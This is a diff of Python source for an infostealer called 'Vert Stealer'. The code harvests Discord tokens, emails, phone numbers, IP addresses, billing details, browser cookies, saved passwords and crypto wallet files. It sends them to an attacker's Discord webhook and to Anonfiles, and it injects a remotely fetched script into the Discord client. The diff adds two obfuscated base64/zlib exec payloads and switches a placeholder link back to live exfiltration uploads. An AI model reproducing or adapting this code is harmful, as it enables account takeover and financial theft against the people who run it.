@@ -15,7 +15,7 @@ import random
 import re
 import subprocess
 
-hook = "Your Disord Webhook"
+hook = "You Discord Webhook"
 injecturl = "https://raw.githubusercontent.com/VertX00D/Vert-Stealer/main/Injection/inject.js"
 
 DETECTED = False
@@ -234,7 +234,7 @@ def GetTokenInfo(token):
     pfp = userjson["avatar"]
     flags = userjson["public_flags"]
     nitro = ""
-    phone = "-"
+    phone = ""
 
     if "premium_type" in userjson: 
         nitrot = userjson["premium_type"]
@@ -260,7 +260,6 @@ def checkToken(token):
             
 def uploadToken(token, path):
     global hook
-    global myhook
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -275,48 +274,48 @@ def uploadToken(token, path):
     billing = GetBilling(token)
     badge = GetBadge(flags)
     friends = GetUHQFriends(token)
-    if friends == '': friends = "No Rare Friends"
+    if friends == '': friends = "Not Found Rare Friends"
     if not billing:
-        badge, phone, billing = "🔒", "🔒", "🔒"
-    if nitro == '' and badge == '': nitro = " -"
+        billing = "-"
+    if nitro == '' and badge == '': nitro = ""
 
     data = {
-        "content": f'{globalInfo()} | Found in `{path}`',
+        "content": f'{globalInfo()} | `{path}`',
         "embeds": [
             {
-            "color": 11927807,
+            "color": 3092790,
             "fields": [
                 {
-                    "name": ":rocket: Token:",
+                    "name": "Token:",
                     "value": f"`{token}`"
                 },
                 {
-                    "name": ":envelope: Email:",
+                    "name": "Email:",
                     "value": f"`{email}`",
                     "inline": True
                 },
                 {
-                    "name": ":mobile_phone: Phone:",
+                    "name": "Phone:",
                     "value": f"{phone}",
                     "inline": True
                 },
                 {
-                    "name": ":globe_with_meridians: IP:",
+                    "name": "IP:",
                     "value": f"`{getip()}`",
                     "inline": True
                 },
                 {
-                    "name": ":beginner: Badges:",
+                    "name": "Badges:",
                     "value": f"{nitro}{badge}",
                     "inline": True
                 },
                 {
-                    "name": ":credit_card: Billing:",
+                    "name": "Billing:",
                     "value": f"{billing}",
                     "inline": True
                 },
                 {
-                    "name": ":clown: HQ Friends:",
+                    "name": "HQ Friends:",
                     "value": f"{friends}",
                     "inline": False
                 }
@@ -326,16 +325,16 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "VERT STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                "text": "@vertstealer",
+                "icon_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
-                }
+                },
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
-        "username": "VERT Stealer",
+        "avatar_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png",
+        "username": "Vert",
         "attachments": []
         }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -362,20 +361,21 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "VERT | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [VERTCookies.txt]({link})",
-                    "color": 11927807,
+                    "title": "Vert Cookies",
+                    "description": f"Found in Cookies ({CookiCount} cookies):\n{rb}\n\n• [VertCookies.txt]({link})",
+                    "color": 3092790,
                     "footer": {
-                        "text": "@VERT STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                        "text": "@vertstealer",
+                        "icon_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png"
                     }
                 }
             ],
-            "username": "VERT",
-            "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+            "username": "Vert",
+            "avatar_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        import base64, zlib; exec(compile(zlib.decompress(base64.b64decode(b'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')), "<string>", "exec"))
         return
 
     if name == "wppassw":
@@ -388,17 +388,17 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "VERT | Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [VERTPassword.txt]({link})",
-                    "color": 11927807,
+                    "title": "VERT Passwords",
+                    "description": f"Found in Passwords ({PasswCount} passwords):\n{ra}\n\n• [VertPasswords.txt]({link})",
+                    "color": 3092790,
                     "footer": {
-                        "text": "@VERT STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                        "text": "@vertstealer",
+                        "icon_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png"
                     }
                 }
             ],
             "username": "VERT",
-            "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+            "avatar_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -409,28 +409,25 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                "color": 11927807,
+                "color": 3092790,
                 "fields": [
                     {
-                    "name": "Interesting files found on user PC:",
+                    "name": "File found on user PC:",
                     "value": link
                     }
                 ],
-                "author": {
-                    "name": "VERT | File Stealer"
-                },
                 "footer": {
-                    "text": "@VERT STEALER",
-                    "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                    "text": "@vertstealer",
+                    "icon_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png"
                 }
                 }
             ],
-            "username": "VERT",
-            "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+            "username": "Vert",
+            "avatar_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-        import base64, zlib; exec(compile(zlib.decompress(base64.b64decode(b'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')), "<string>", "exec"))
+        requests.post(hook, json={'content': f'💉 Successfuly Discord Injected.', "username": 'Vert', "avatar_url": 'https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png'})
         return
 
 
@@ -443,9 +440,9 @@ def upload(name, link):
 #     # r = requests.post(hook, files=files)
 #     LoadRequests("POST", hook, files=files)
 
-    _1ject()        
+    inject()        
 
-    def _1ject():
+    def inject():
         appdata = os.getenv("localappdata")
         roaming = os.getenv('APPDATA')
         h00ksreg = "api/webhooks"
@@ -468,7 +465,7 @@ def upload(name, link):
                                 if ntpath.exists(inj_path):
                                     if srtupl0c not in argv[0]:
                                         try:
-                                            os.makedirs(inj_path + 'vertstealer', exist_ok=True)
+                                            os.makedirs(inj_path + 'vert', exist_ok=True)
                                         except PermissionError:
                                             pass
                                     if h00ksreg in hook:
@@ -629,7 +626,7 @@ def GatherZips(paths1, paths2, paths3):
 
     wal, ga, ot = "",'',''
     if not len(WalletsZip) == 0:
-        wal = ":coin:  •  Wallets\n"
+        wal = "<:coins:1041596503921262622>  •  Wallets\n"
         for i in WalletsZip:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(WalletsZip) == 0:
@@ -637,7 +634,7 @@ def GatherZips(paths1, paths2, paths3):
         for i in GamingZip:
             ga += f"└─ [{i[0]}]({i[1]})\n"
     if not len(OtherZip) == 0:
-        ot = ":tickets:  •  Apps\n"
+        ot = "<:tickets:1041596505263456256>  •  Apps\n"
         for i in OtherZip:
             ot += f"└─ [{i[0]}]({i[1]})\n"          
     headers = {
@@ -649,17 +646,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "VERT Zips",
+            "title": "Vert Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": 11927807,
+            "color": 3092790,
             "footer": {
-                "text": "@VERT STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                "text": "@vertstealer",
+                "icon_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png"
             }
             }
         ],
         "username": "VERT Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+        "avatar_url": "https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png",
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -678,8 +675,8 @@ def ZipTelegram(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com"
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    #lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
 
@@ -720,8 +717,8 @@ def ZipThings(path, arg, procc):
         if not ".zip" in file: zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com"
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    #lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
 
     if "Wallet" in arg or "eogaeaoehlef" in arg:
